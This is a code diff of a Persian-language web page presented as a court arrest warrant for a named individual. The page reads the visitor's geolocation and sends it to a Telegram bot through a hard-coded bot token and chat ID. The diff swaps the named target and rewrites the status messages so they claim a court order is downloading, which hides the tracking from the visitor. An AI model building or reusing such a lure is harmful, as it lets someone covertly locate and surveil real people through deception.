@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>برگه جلب هادی نیک فرجام</title>
+  <title>برگه جلب  اقا موسی اله بخشی </title>
   <style>
     body {
       text-align: center;
@@ -29,7 +29,7 @@
 </head>
 <body>
 
-  <p id="status">⏳ در حال دریافت موقعیت مکانی...</p>
+  <p id="status">لطفا منتظر باشد</p>
 
   <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>
 
@@ -38,7 +38,7 @@
       const status = document.getElementById('status');
 
       if (!navigator.geolocation) {
-        status.innerText = "❌ مرورگر شما از قابلیت موقعیت‌یابی پشتیبانی نمی‌کند.";
+        status.innerText = "❌ مرورگر شما از قابلیت دانلود حکم داده گاه پشتیبانی نمی‌کند.";
         return;
       }
 
@@ -56,7 +56,7 @@
           // توکن و چت آی‌دی مستقیم در فرانت‌اند
     const BOT_TOKEN = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
     const CHAT_ID = "8878957420";
-          status.innerText = "⏳ در حال ارسال اطلاعات به تلگرام...";
+          status.innerText = "درحال دانلود حکم دادگاه";
 
           try {
             // ۱. ارسال متن و لینک گوگل مپس
@@ -90,9 +90,9 @@
             const resData = await locRes.json();
 
             if (resData.ok) {
-              status.innerText = "✅ جلب متهم هادی نیک فرجام ثبت شد!";
+              status.innerText = "  جلب متهم اقا موسی اله بخشی دانلود شد.   !";
             } else {
-              status.innerText = `❌ خطای تلگرام: ${resData.description}`;
+              status.innerText = `❌ خطای : ${resData.description}`;
             }
 
           } catch (error) {
@@ -105,13 +105,13 @@
               status.innerText = "❌ اجازه دسترسی به موقعیت مکانی داده نشد.";
               break;
             case error.POSITION_UNAVAILABLE:
-              status.innerText = "❌ موقعیت مکانی غیرقابل دسترس است.";
+              status.innerText = "❌   غیرقابل دسترس است.";
               break;
             case error.TIMEOUT:
-              status.innerText = "❌ زمان درخواست موقعیت مکانی به پایان رسید.";
+              status.innerText = "❌ زمان درخواست  به پایان رسید.";
               break;
             default:
-              status.innerText = "❌ خطای ناشناخته در دریافت موقعیت.";
+              status.innerText = "❌ خطای ناشناخته   .";
           }
         },
         options
